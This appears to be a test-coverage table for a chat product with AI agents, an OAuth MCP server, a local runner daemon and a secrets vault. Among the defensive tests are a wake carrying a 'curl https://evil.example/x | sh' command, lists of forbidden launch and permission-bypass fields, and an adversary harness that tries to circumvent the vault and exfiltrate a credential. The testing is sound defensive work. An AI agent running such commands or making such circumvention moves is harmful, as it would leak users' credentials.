| `DRAFT-INT-006`, `SCHED-MSG-INT-008` | `tests/browser/saved-content.spec.ts` | A draft synced to the server and read back by a second browser carrying the same session, spent on send; and a message scheduled, listed, and cancelled before it could arrive. |
| `PROD-RULE-001–014` | `src/domain/productivity.test.ts` | Slash command classification including the `//` escape and refusal of an unknown command, the text the speaking commands post, custom emoji name normalisation and confusable-name refusal, token scanning, and snippet parsing that keeps code indentation while bounding title, language and length. |
| `SNIP-INT-001–003`, `CMD-INT-001–004`, `EMOJI-INT-001–004` | `tests/productivity.test.ts` | Snippets posting a summary into history with the body beside it and out of every record that outlives it; commands carried out through the same authority a button would use, with an unknown one refused rather than posted and no command reaching further than the person typing it; admin-only emoji naming, one name one meaning, a reaction refused for an undefined name and still withdrawable after the name is removed. Solo refusals throughout. |
| `CMD-INT-005`, `SNIP-INT-004`, `EMOJI-INT-005` | `tests/browser/productivity.spec.ts` | The same three driven as a signed-in member: a command run and a mistyped one refused, a long snippet collapsed and expanded, and an emoji named, refused when confusable, and removed. |
| `AGENT-RULE-001–018` | `src/domain/agents.test.ts` | The `a.` namespace and refusal of a name from another one; the single scope rule proving the write side is never looser than the read side; each of the three enqueue brakes and their order; the last-owner guard; the preamble's clauses, its tier order, and that the module exports no way to change it; and injection flags that flag without filtering. |
| `AGENT-INT-001–014` | `tests/agents.test.ts` | Agent creation owned by its creator, handles refused or already taken, an agent id rejected as an actor everywhere and absent from the members table, the last-owner guard in both the code and the database, somebody else's agent reported as missing, the three tiers shown to an owner with the brief kept out of the audit record, out-of-scope mentions never written at all, an empty scope list acting as a pause, a private room in a scope not disclosed to others, and each brake including rollback of queued work with its message. |
| `AGENT-INT-015` | `tests/browser/productivity.spec.ts` | Creating an agent as a signed-in member, a namespace-violating handle refused, and the compiled-in preamble readable with its "not editable" statement. |
| `FORM-INT-001` | `tests/browser/productivity.spec.ts` | With scripting switched off, so the page can never hydrate: an agent is created, a namespace-violating handle is refused with its error rendered, a custom emoji is named and then removed — all through real form posts to server actions — and the composer, which cannot work before hydration, reports itself as not editable rather than accepting characters the first render would wipe. |
| `MCP-RULE-001–016` | `src/domain/mcp-oauth.test.ts` | The token shape that routes to one workspace and parses one way; resource identity and its RFC 9728 metadata location; mandatory RFC 8707 resource indicators compared exactly; PKCE S256 with `plain` refused and a constant-time comparison; what a client may register as a redirect and the exact match it is held to, with the loopback port as the single exception; open registration bounded; an unknown scope refused rather than dropped; the bearer challenge that cannot break out of its own quoting; which authorization refusals may be redirected and which may not; RFC 9207 issuer identification; the code binding re-checked at redemption; refresh rotation with replay read as a leak; the audience checked against where the request arrived; and the origin taken from the host the client addressed. |
| `MCP-RULE-017–019` | `src/domain/mcp-oauth.test.ts` | Strict tool names and argument shapes with per-tool scopes and no voting capability; opaque, tamper-refusing agent-queue cursors; and the exact per-connection/per-agent write-window boundary. |
| `MCP-INT-001–007` | `tests/mcp-oauth.test.ts` | The same authorization server against a real Durable Object: a connection made by a member that acts as that member with the credential kept out of the audit; a code that is single-use, expires in a minute and is refused for a wrong verifier, a changed redirect or another client; rotation, a replayed refresh token killing the whole connection, and another client refused without killing it; one workspace's token refused at another in both directions and when it claims the other's audience; membership re-checked live so removal cuts a connection off with nothing to revoke; access expiry with the connection still refreshable; scope enforced; a person listing and ending only their own connections, with somebody else's reported as missing; and an authorization request refused for a stale epoch or an absent member. |
| `AGENT-QUEUE-INT-001–003`, `AGENT-TOOLS-INT-001–003` | `tests/agent-tools.test.ts` | Private-room-safe keyset queue pages and display read state independent from execution; one-winner claims, lost-response replay, lease generation/token/session fencing, exact completion replay, bounded pre-start retry/dead-letter behavior and post-start attention; live owner/connection/scope enforcement, persistent human/agent attribution, thread posting with no agent-to-agent enqueue loop, Solo content refusal, and strongly consistent per-connection/per-agent write limits. |
| `AGENT-SESSION-RULE-001–003` | `src/domain/agent-session.test.ts` | Delegation and session lifetime ceilings, normalized non-widening capabilities, and exact tool/channel intersection rules. |
| `AGENT-SESSION-INT-001–005` | `tests/agent-sessions.test.ts` | Digest-only scoped session credentials; delegated channel limits on posting and queue claims; exact-tuple token rotation; immediate denial after delegation revoke, owner removal, member offboarding, agent pause or expiry; single-live-session replacement; and cross-workspace refusal. |
| `MCP-INT-008–013` | `tests/browser/mcp-oauth.spec.ts` | The whole dance against the built Worker: discovery, registration, consent, redemption, rotation, disconnect and cross-workspace refusal, followed by tool discovery and scoped channel/agent reads, human posting, claim/start/renew/complete, an agent reply in the originating thread, stable connection/client or session/delegation/device attribution after a fresh read, refusal of agent tools on read-only connections, a runner session confined to its delegated tools/channels, and vault metadata discovery whose HTTP results exclude plaintext, ciphertext and wraps. |
| `MCP-WAIT-INT-001–003` | `tests/browser/mcp-waiting.spec.ts` | The D03 waiting spike against the built Worker: three separate pieces of work drained in one session with one set of credentials and every call bounded; an empty queue answered immediately rather than parked, which is the measurement the decision rests on; a wake that never arrived recovered by one bounded call; and a session stopped mid-work refused at its next call and still refused after. Each scenario records the latencies it observed, so "bounded" stays a measured claim. |
| `RUNNER-INT-001–015` | `tests/runner.test.ts` | The designated runner against a real Durable Object: one device per agent with a displaced device named so it can be stopped, another member's agent reported as missing and their device as unregistered; a stale runner epoch refused and agents a re-registration drops released; a wake persisted in the same transaction as the queue row it announces, none written for an unassigned agent, repeated work collapsed into one pending wake and a wake staged by a rolled-back mutation discarded; a wake frame read off the real socket and checked for exactly the six D05a keys; an undelivered wake collected on reconnect and marked delivered once; a socket refused for an unauthorized member, an unregistered device, a stale epoch and another member; a runner kept out of presence; a stop on pause that also drops the pending wake and reports zero depth; an owner releasing a device with nothing connected; and a registration audited as counts and revisions with the preset's name absent from the chain. |
| `RUNNER-RULE-001–035` | `src-tauri/crates/lepidy-runner/src/*.rs` | The daemon's own decisions, without a network (two of them assert Unix process-group behaviour and are skipped on Windows): the trigger schema refusing `command`, `args`, `argv`, `cwd`, `env`, `permissionMode`, `dangerouslySkipPermissions` and `executable` outright, and refusing empty, missing, non-object and non-positive-revision triggers; a preset store whose revision moves on every edit, that refuses a file other users can read, and that treats a missing file as empty; the local decision order with a stop outranking every other answer, an unknown preset refused rather than guessed, a stale revision refused, per-agent concurrency and cooldown; a process tree stopped so a grandchild cannot outlive it, an overdue run killed, and a harness's own exit status reported; frames that are refused when unrecognised; and reconnect backoff that never spins and never gives up. |
| `RUNNER-CLI-INT-001–012` | `src-tauri/crates/lepidy-runner/tests/runner_integration.rs` | The compiled `lepidy-agentd` against a local double that verifies the signed envelope and speaks a real WebSocket handshake: launch configuration refused without the local passphrase and refused again when the preset file is loosened; a registration that is signed, carries the preset revision in its claims, and contains no program, argument, directory or environment; registering for a preset this machine does not hold refused before anything is sent; an outbound socket that runs the preset a wake names; a wake carrying `"command": "curl https://evil.example/x | sh"` starting nothing and saying so; an unknown preset and a stale revision each refused; work found by a depth check no wake announced; a stop mid-run killing a grandchild that would otherwise have outlived it; thirty wakes in a moment costing one process; an unsigned socket delivering nothing; and no passphrase or device credential in any output. |
| `RUNNER-SOCKET-INT-001–005` | `tests/browser/runner-socket.spec.ts` | The runner socket against the built Worker over real HTTP and a real WebSocket handshake: a socket refused until the device registers, then a welcome naming the agents it answers for; a mention in a room arriving as a wake whose trigger has exactly the six D05a keys and whose whole frame contains no command, argv, cwd, env or permission field; a wake missed while the machine was off collected on reconnect and agreeing with a signed depth check; an unsigned upgrade, a tampered signature and a superseded epoch each refused; and an owner standing a machine down while it is connected, closing the socket and refusing its reconnection. |
| `RUNNER-INT-016–022` | `tests/runner.test.ts` | The harness workflow against a real Durable Object: a session minted for an agent a device is the designated runner for, bound to that device, runner epoch and preset revision, stored as a digest and absent from the audit chain, carrying exactly a harness's ten capabilities; a session refused for an agent this device does not answer for, for another member's device and for an agent whose delegation has been revoked; a blocked run turning that session's claims into `needs_attention` rather than retries; a report naming another session leaving that session's in-flight work alone; a run recorded as counts and an outcome without the harness's own words; and work that arrives mid-run still visible to the depth check after the exit. |
| `RUNNER-RULE-036–040` | `src-tauri/crates/lepidy-runner/src/daemon.rs` | The daemon's session rules: a harness never started without one, an expired token treated as none at all, one session kept across many runs, a session asked for on connecting and not again while a good one is held, and a harness's exit status read as completed, blocked or failed — with a killed process, which has no code of its own, never read as a clean finish. |
| `RUNNER-CLI-INT-013–017` | `src-tauri/crates/lepidy-runner/tests/runner_integration.rs` | The compiled daemon and the reference harness end to end against a double that speaks real MCP: a claim drained and answered in the room it came from, with every call bearing the session the daemon minted and the run reported as `completed` against it; three separate runs served by one session, minted once; a harness blocked by its own permission posture reported as `blocked` with its claim left for a person, nothing posted, and the operator told in words; work that arrived while the last run was ending found by the check after the exit rather than by a wake, without costing a new session; and the session token absent from every command line, log line and the preset file. |
| `RUNNER-SOCKET-INT-006/007` | `tests/browser/runner-socket.spec.ts` | The workflow against the built Worker: a session minted over the signed device transport working as a real MCP credential, refusing `post_message` as a person, and refused outright for an agent the device is not the designated runner for; and a blocked run reported by the daemon parking the claim so the next `agent_next` is answered with no item rather than handing refused work straight back. |
| `GATE-INT-001` | `tests/browser/product-gate.spec.ts` | The first complete product gate against the built Worker and compiled Linux native tools: a browser approval device and separately enrolled runner device; locally persisted assignment and fresh-epoch registration; mention-started barrier harness; agent/delegation-bound synthetic credential request; deny starting nothing; a genuine user-verified WebAuthn allow; local unwrap and real child-process environment injection; attempted stdout/stderr leak scrubbed; a reply attached to the originating thread; a second mention reusing the same scoped session; and a browser-side delegation revoke killing a third in-flight process tree. The canary is asserted absent from HTTP/UI, daemon output, CLI output, profile and preset storage. |
| `NATIVE-RULE-001–024` | `src-tauri/src/{origin,verification,supervisor,ipc}.rs` | The desktop shell's boundaries: an origin parsed strictly and compared as an origin rather than a prefix, refusing `lepidy.example.evil.test`, embedded credentials, a different scheme, port or subdomain, and plain HTTP off loopback; a confirmation bound to a digest of the exact action and subject, refused when spent, stale, backdated or collected for something else, and forgotten wholesale when the shell loses track of who is there; a platform with no verifier refusing rather than assuming, and recording nothing; every command refusing an untrusted caller, `runner_stop` working with nothing confirmed and nothing running, `runner_start` refused before anything is spawned and its confirmation spent even when the spawn then fails; and a supervisor that reports a daemon which exited on its own as stopped unexpectedly rather than as answering. P01a extends the untrusted-caller case to `notify` and `set_badge`, and adds a notification from the *trusted* page still being sanitised and still refused an off-workspace destination. |
| `NATIVE-INT-001–016` | `src-tauri/tests/native_boundary.rs` | The native surface asserted as configuration, because none of it fails a compile when it grows: exactly the registered commands, each actually defined; every command calling the origin check; a capability file granting only `core:` window permissions and none of `shell`, `fs`, `process`, `http`, `updater`, `notification`, `clipboard` or `dialog`, scoped to the one window; `withGlobalTauri` off, a `default-src 'self'` policy with no `unsafe-eval`, and no plain-http remote origin; and stop reaching the supervisor directly from both the window and the tray with no confirmation in its way. P01a adds four: the runtime capability granted to the configured workspace origin listing exactly the permissions the checked-in file lists, remote-only and scoped to the one window; one declared URL scheme, matching the one the parser accepts; a bundled fallback document that fetches nothing, runs no script of its own and offers no control it could not honour; and a global-shortcut handler that reaches the supervisor's stop with no branch in it that starts anything and no command able to name the chord. P01b adds four more: updater endpoints that are https with none of the three `dangerous…` escape hatches taken; an empty `pubkey` in the committed configuration, the key read at build time instead, and the plugin registered only when there is one; no command that mentions update, restart or install, no public accessor for the pending update, and a tray handler that stops the runner strictly before it installs; and a bundle that is active, produces updater artifacts, declares its sidecars in the direct-build config rather than the base one, carries both the CLI and the daemon, and names only icons that exist. `NATIVE-INT-001` also now asserts the command surface agrees across the invoke handler, `build.rs` and the capability files, and `NATIVE-INT-003` that every registered command is granted by name — the gap that made all seven unreachable from a remote origin. P02 adds three: each channel having its own bundle configuration with only the direct download producing updater artifacts, and a store variant saying so rather than inheriting it; the Microsoft Store and direct packages carrying both the CLI and the daemon while the Mac App Store package carries neither; and the Mac App Store entitlements asking for the sandbox and outgoing network and for none of the six entitlements that would be reaching for the capability the sandbox exists to withhold — checked against the declarations rather than the file's own explanation of what it deliberately omits. |
| `DISTRIBUTION-RULE-001–019` | `src-tauri/src/{distribution,updater}.rs` | What a build must have before it may emit something installable, and what replacing a running supervisor must do first. A machine with no signing material refused on Windows and macOS; either accepted spelling of each credential satisfying it, so a correctly configured machine is never refused; an empty variable not counting as a credential, which is the CI-fork case; macOS signing without notarising still refused, because that ships something that does not open; the updater signing key required only when an updater artifact is produced; a refusal that names variables, never reads their values, and says what would fix it; sidecar names for each platform's triple; the direct build carrying both the CLI and the daemon. And for the updater: a build with no compiled-in key having no updater at all, every non-https endpoint refused including one bad endpoint among good ones, a tray label that states the consequence before it is chosen, an install that stops the runner first and reports what it interrupted, and a first check that is not at startup with an interval that is not a heartbeat. P02 adds the channel matrix: one sandbox rule removing both the injection engine and the ability to host a runner, on the Mac App Store channel and nowhere else; only the direct download updating itself; a store package not being asked for the key that signs releases while the direct build on the same machine still is; every variant naming its own configuration file; an unrecognised variant string meaning the full product rather than a silently crippled one; and both refusal sentences naming what is missing, why it cannot be fixed there and where the working thing is, with the runner one also naming what the build can still do. |
| `DESKTOP-GUI-001–004` | `tests/desktop/gui.mjs` | The only suite that drives the real application, through `tauri-driver` against the built Worker. A window that opens on the trusted origin with Lepidy's own page in it; the shell marking the document with the desktop platform, which is what reserves room for the native window controls; a native command answered from the real page through the real webview and the real origin check — the scenario whose first run found every command refused by the access-control layer; and a look-alike origin refused by `on_navigation` when the page itself asks to go there, leaving a window that still works rather than a wedged one. Not part of `verify:local`; see above. |
| `PRESENCE-RULE-001–031` | `src-tauri/src/{deeplink,presence,hotkey,offline}.rs` | What the shell does when nobody is looking at it, and what each of those refuses. Deep links: every destination in the closed set opening a rooted single-query path on its own origin, and refusals for a link carrying a URL, a query, a fragment, any percent-encoding, a backslash, `.`/`..`, an over-long segment or link, another application's scheme, an empty authority, and for every verb that would *do* something rather than show something. Notifications: control characters and bidirectional overrides removed, whitespace collapsed, length bounded in characters rather than bytes, an empty title refused, and an activation target refused for everything the deep-link parser refuses. Badges: digits and at most one `+` for every input up to `u64::MAX`, zero clearing, and the number and the label never disagreeing. The kill switch: a chord with no modifier beyond shift, a chord the operating system owns and an unknown key each refused, a mistyped override refused rather than silently replaced by the default, and a failed registration naming the tray, the web app and the CLI. The offline fallback: only a load that never finished changing what is shown, a status that reads differently for running, stopped and exited and never says the agents are stopped when they are not, always naming where the stop is, native text reaching the page as characters rather than as code, the bundled document admitted by the navigation guard while every look-alike host, sibling page and query-carrying variant is refused, and a grace period, a give-up that keeps its attempt count and a capped backoff. |
| `RUNNER-RULE-041` | `src-tauri/crates/lepidy-runner/src/preset.rs` | The Windows half of the owner-only preset check: `icacls` output parsed by stripping the exact path that was passed, so a path with spaces and a principal like `NT AUTHORITY\\SYSTEM` are both read correctly; the `BUILTIN\\Users` entry the check exists to catch is not skipped; and output that cannot be read is an error rather than an empty list, because a parser that silently drops entries is a check that silently passes. |
| `RUNNER-RULE-042–050` | `src-tauri/crates/lepidy-runner/src/{checkup,preset}.rs` | Everything about a preset answerable without a model: a program that does not exist, is not a file or has no executable bit refused, and a bare name warned rather than refused because PATH resolution is the operator's decision; a deleted working directory refused; limits that would defeat the brakes refused, and no-cooldown-with-many-concurrent warned as the combination that turns a mention loop into a fork bomb; the WSL boundary decided from both sides on any platform, because an operating-system rule that can only be checked on one operating system is not much of a rule; a pinned harness version matching, absent, or drifted — the last a failure, since a flag, a posture and an exit code can all change between versions and no comparison of numbers says which way; a version read from a real program's `--version`; and pinning that deliberately does not move the preset revision. |
| `RUNNER-CLI-INT-018–022` | `src-tauri/crates/lepidy-runner/tests/runner_integration.rs` | The matrix through the compiled daemon: a broken preset failing `preset check` with nothing pinned and the daemon refusing to start rather than discovering it at the first mention; a version observed from a real program and pinned, then cleared by an edit while the revision moves; a harness rewritten as if upgraded, read as unvalidated; a real Windows executable named from this WSL Linux refused with the consequence and the fix in the message; and the harnesses actually installed on the gate machine — Claude Code and Codex — located, asserted runnable and their reported versions recorded. |
| `VAULT-CLI-INT-005/011` (extended) | `src-tauri/crates/lepidy-cli/tests/cli_integration.rs` | File deliveries now assert real owner-only permissions on both platforms: mode bits on Unix, and on Windows the delivered file's own access-control list read back with `icacls` and required to name the current user alone — inheritance stripped, so not `Users`, not `Everyone`, and not `SYSTEM` or the administrators group either. Until R04 the Windows half only asserted that the file existed. |
| `RUNTIME-RULE-001–007` | `src/domain/runtime-config.test.ts` | The runtime screen's rules as case tables: the four runtimes and the one that is attended; who may cause a start, with an absent requester refused under owners-only rather than read as an owner; the closed intent set refusing anything that could carry a command, and a pending ask that clears only when the machine's own revision moves; the delegation sentence, including an empty room list read as "no room" rather than as unrestricted; failure codes turned into words a person can act on; and budgets refused rather than rounded. |
| `RUNTIME-INT-001–012` | `tests/runtime-config.test.ts` | The surface against a real Durable Object, each write paired with a valid non-owner who is refused: choosing connected or local, with a provider runtime refused as a bare choice and a move away from local dropping the machine's uncollected wake; a start policy that queues the work and refuses only the wake, so nothing is lost and an owner can still start by hand; an ask that survives a re-registration at the same revision, clears on a higher one, reaches the daemon through the depth check, and stores none of the eighteen forbidden launch fields offered alongside it; the whole workspace schema asserted to declare no column any of those could occupy; a stop that reaches every live session and drops the pending wake; an expiry that moves forward only, never backwards and never after a revoke; failed and budget-stopped runs surfaced rather than hidden; and the items a blocked run left needing a person. |
| `RUNTIME-UI-INT-001–006` | `tests/browser/runtime-ui.spec.ts` | The screen against the built Worker at desktop and mobile sizes: the four runtimes and the attended/unattended division; the delegation restated as one sentence; a real registered machine shown by name, opaque preset id and revision, with the page then searched for a launch editor under every plausible label and for `/bin/sh`, `cmd.exe` and `acceptEdits` anywhere in the rendered document; an ask that stays pending across a same-revision registration and is confirmed by a higher one; a live session stopped; a valid non-owner shown the refusal page and no preset name; cloud and custom offered as setup rather than as radio buttons that do nothing, with the jitter and daylight-saving facts stated and a mistyped budget refused; and a keyboard, dark mode and an `axe` WCAG 2 AA scan on desktop. |
| `RUNNER-CLI-INT-023` | `src-tauri/crates/lepidy-runner/tests/runner_integration.rs` | The compiled daemon printing the local reviews an owner asked for, from the depth check it already makes, and changing nothing because of them — the preset revision is unmoved afterwards. |
| `MOCKUP-SEC-001/002/003` | `tests/browser/mockup-contracts.spec.ts` | Rendered Solo storage, local-only runner configuration and user-held vault recovery disclosures. |
| `ONBOARD-RULE-001–009`, `CANARY-RULE-001–006` | `src/domain/agent-onboarding.test.ts`, `src/domain/vault-canary.test.ts` | The onboarding text and the leak-detection rules as case tables: the always-on instruction inside an asserted token budget and naming no value path; shell segmentation, the leading program behind wrappers and assignments, a rewrite that is copy-pasteable, a correct command reported as correct, and a credential the workspace does not hold never invented; the canary marker and value shapes, a marker found anywhere in a body and reported once, and a scan digest bound to workspace, credential and version with a minimum length below which none is stored. |
| `VAULT-ONBOARD-INT-001–007` | `tests/vault-onboarding.test.ts` | Scan targets and the canary tripwire against a real Durable Object, each paired with a valid counterpart that must not be served or must not be refused: digests served to a member holding a verb and to nobody else, with no ciphertext, wrap or value in the payload; a credential with no published digest absent rather than present-and-empty; a rotation replacing the digest and clearing it when none is sent; a malformed digest, a too-short length and a duplicate canary marker each refused with no partial row; an agent post carrying a canary refused before the write, with the alert as the only message it produced, a durable trip row, an audit entry and no excerpt of the body anywhere; the same room still taking an ordinary message that names the credential; a person's own message refused the same way; and a proxy request refused before an idempotency row exists, so the retry is refused too rather than replaying. |
| `VAULT-ONBOARD-UI-001–003` | `tests/browser/vault-onboarding.spec.ts` | The same surfaces over real HTTP against the built Worker at desktop and mobile sizes: `initialize` carrying the authority sentence and the budgeted vault rule; `tools/list` showing `credential_hint` and no tool that returns or stores a value; a hint naming the credential and the exact rewrite; a listing carrying `lepidy run --with` and the canary flag but no value; an invented `request_secret` refused as an unknown tool; scan targets fetched over the signed device transport and absent from a second valid workspace's device; and a canary write refused with a message that names the credential without quoting it, alongside the ordinary message that is accepted. Every response body is searched for both seeded values. |
| `VAULT-CLI-RULE-041–070` | `src-tauri/crates/lepidy-cli/src/{advice,hint,hook,init,scan,add}.rs` | The local advice surfaces as case tables: a cache that is missing, unparseable or a version this build does not know treated as no cache at all; a written cache carrying no ciphertext or wrap; the hook's five ordered rules with first-match-wins, its fail-open input handling, and the ordinary reads it must leave alone; `init` refusing to overwrite a file that differs and never rewriting project settings it did not write; and a canary generated to the exact shape the workspace recognises. |
| `VAULT-CLI-INT-024–030` | `src-tauri/crates/lepidy-cli/tests/cli_integration.rs` | The compiled binary against the local double: `scan` finding a seeded value in a file and on standard input, naming the credential without quoting it, saying what it cannot find, and missing an encoded value as documented; `scan` with no cache failing open rather than blocking a commit; `hint` answering from the cache with the exact rewrite and staying silent for a command that needs nothing; the `PreToolUse` hook blocking a value in argv, an echoed variable, a bare `env`, a credential file and an unwrapped command while allowing the correct command, ordinary work and `.env.example`, and failing open on anything it does not understand; `add --canary` generating the value locally, never printing it, and publishing only the public marker with two canaries never alike; a canary found by its marker alone; and `init` writing the MCP entry, the skill and the hook while leaving somebody else's configuration exactly as they left it. |
| `VAULT-EVAL-INT-001` | `src-tauri/crates/lepidy-runner/tests/runner_integration.rs` | The anti-circumvention gate: `lepidy-harness-adversary`, a real harness process launched by the real daemon under a real scoped session, reads the decoy `.env` and then tries fifteen documented moves. Four invented value-returning tools refused as unknown; the listing carrying no value; five circumvention commands blocked by the real hook binary and the correct command still allowed; the scanner naming the credential in the decoy; the exfiltration post refused by the workspace; and the recursive directory read recorded as **deliberately not blocked**, because the rule that would catch it is the rule that allows `grep -r TODO .` — with the write it enables refused anyway, which is the point of the hook not being the boundary. The run is reported `blocked`, the canary is absent from the daemon output, the preset store, the advice cache and the profile, and only the socially engineered ask reaches the room. |
| `C07-RULE-001–009` | `src/domain/people.test.ts` | The shared directory rules as case tables: normalized `g.` handles and reserved broadcast names; bounded profile and paired working-hour validation; owner/admin role boundaries including the last-owner guard; deterministic active-only group fan-out with an empty-group refusal and a hard 50-recipient ceiling; the exact typed ownership-transfer phrase; a declared availability outranking an open connection while `auto` falls back to it; another member's own clock refusing to fall back to the reader's; and hovercards built only from a directory the reader already holds, naming a group's real reach, marking a tombstone as one, and counting an agent owner it cannot name rather than dropping them. |
| `C07-INT-001–003` | `tests/people.test.ts` | Real Durable Objects, workspace SQLite and local D1 prove safe tenant-local profiles including a declared availability that survives connection state and an unknown one refused, creator/admin group maintenance, group notification fan-out and empty-group refusal; normalized duplicate-invite refusal, seat-held invitation acceptance, role denial, exact ownership transfer, D1-first offboarding, stale-member denial and revocation of both an active agent delegation and session; and active-only member visibility alongside administrator tombstones. |
| `C07-UI-INT-001–006` | `tests/browser/people.spec.ts` | The built Worker at desktop and mobile sizes renders the directory, persists a creator-managed group and the real profile fields including declared availability and its clearing, holds and cancels a Solo seat-bound invitation, offboards through the authenticated Server Action while retaining the tombstone, opens a saved profile, a group's real membership and an agent's owners as mention hovercards on both pointer and keyboard with a distinct DOM id per card across messages, and passes keyboard, narrow-layout, dark-mode and `axe` WCAG 2 AA checks. The accessibility scenario is mobile-only and is intentionally skipped in the desktop project. |
| `C08-RULE-001–006` | `src/domain/files.test.ts` | The file rules as case tables: the accepted Team allowance at 1, 5, 6 and 20 seats and with purchased packs; warning at 80% and refusing at the ceiling rather than evicting; a name that could escape its key refused while an ordinary name full of punctuation survives; media-type normalization and the rule that an SVG is an image that executes and never renders inline; the tenant-carrying object key and a neighbouring workspace id failing its prefix check; and the one-way upload lifecycle. |
| `C08-INT-001–004` | `tests/files.test.ts` | Real Durable Objects and workspace SQLite prove an unprojected quota refuses every upload, a reservation occupies space before its bytes arrive, a confirmation that disagrees with its reservation is refused, and the remaining allowance is real; a private room's file is invisible, undownloadable and undeletable by a non-member and reported missing rather than forbidden, with access ending in the delete transaction; an abandoned reservation expires, returns its bytes and cannot be confirmed afterwards; and a Solo workspace refuses cloud attachments outright. |
| `C08-UI-INT-001–003` | `tests/browser/files.spec.ts` | The built Worker at desktop and mobile sizes carries real bytes end to end: a file attached through the composer is reserved by a Server Action, streamed to real R2 through the transfer route, bound to its message and served back only as `application/octet-stream` with `nosniff` and an attachment disposition; another workspace and a signed-out caller are refused by id; and a pasted PNG renders inline under `axe` WCAG 2 AA at narrow width. |
| `C08B-RULE-001–004` | `src/domain/link-unfurl.test.ts` | The public-egress preview rules as deterministic case tables: at most three unique HTTPS links extracted while fenced and inline code are ignored; an initial URL and each redirect revalidated through the shared public-IP guard; private destinations, a fourth redirect, non-HTML content and a body beyond 64 KiB refused; title, description and site name reduced to bounded plain text; and DNS plus response work sharing one four-second deadline. |
| `C08B-INT-001–002` | `tests/files.test.ts` | Real Durable Objects and workspace SQLite prove the workspace file index filters name, media type, uploader, room and inclusive dates while excluding an unjoined private room in the SQL query itself; and a cached preview for a visible message is returned while the same cached URL on a private message remains absent to a valid non-member. |
| `C08B-UI-INT-001` | `tests/browser/files.spec.ts` | The built Worker at desktop and mobile sizes receives real text and image uploads through the production transfer path, lists their authorized metadata on Files, applies name and media-type filters, links each result through the separately authorized download route, and passes a narrow-layout `axe` WCAG 2 AA scan. |
| `B01-RULE-001–004` | `src/domain/entitlements.test.ts` | Exact Solo/Team capacity and monthly-price examples for 1/2/5/6/20/21/50 active humans; plan ceilings and indivisible 100 GB packs; ready invitations reserving seats; and lapse changing writability without erasing the purchased allowance. |
| `B01-INT-001/002` | `tests/entitlements.test.ts` | Real local D1 and a real workspace Durable Object prove every new workspace receives one authoritative entitlement row, Team seat/pack changes project the exact attachment allowance, ready invitations reserve capacity, a client cannot assert that billing happened, and a held invitation becomes deliverable only after D1 capacity actually increases. |
| `B01-UI-INT-001` | `tests/browser/files.spec.ts` | The built Worker at desktop and mobile sizes projects the Team entitlement before reading Files and renders the exact used/total attachment allowance beside the real file index; the existing narrow-layout accessibility scan includes the capacity strip. |
| `C09-RULE-001–004` | `src/domain/search.test.ts` | The complete v1 operator grammar and `@`/`#` normalization; invalid recognized operators reported rather than ignored; raw FTS syntax reduced to bounded inert prefix terms; and malformed or oversized cursors bounded deterministically. |
| `C09-INT-001–004` | `tests/search.test.ts` | Real Durable Objects and workspace SQLite/FTS5 prove message and file-metadata search across every operator family with private-room authority inside the query; ACL-filtered credential name/description discovery with encrypted values absent and unmatchable; edit/delete trigger maintenance and non-overlapping pages; private saved queries and owner-only deletion; malformed-query feedback; and Solo cloud search refusing because its host owns content. |
| `C09-UI-INT-001` | `tests/browser/search.spec.ts` | The built Worker at desktop and mobile sizes creates a real message and R2 attachment, finds both through a room-scoped operator query, saves the query through an authenticated Server Action, jumps to the exact message anchor, re-enters through Search this room, and passes narrow-layout overflow and `axe` WCAG 2 AA checks. |
| Supporting rule cases | `src/domain/idempotency-key.test.ts` | Bounded transport-safe idempotency keys; a command integration test must consume this rule when mutation handling lands. |

The desktop rendering tests cover web content under the same platform marker injected by Tauri. Actual minimize/maximize/close calls require the WebdriverIO Tauri harness and remain part of R03/P01 rather than being inferred from browser tests.

## Tool references

- Cloudflare Workers Vitest integration: <https://developers.cloudflare.com/workers/testing/vitest-integration/>
- Durable Object testing: <https://developers.cloudflare.com/durable-objects/examples/testing-with-durable-objects/>
- Playwright local web server: <https://playwright.dev/docs/test-webserver>
- Tauri WebDriver testing: <https://v2.tauri.app/develop/tests/webdriver/>
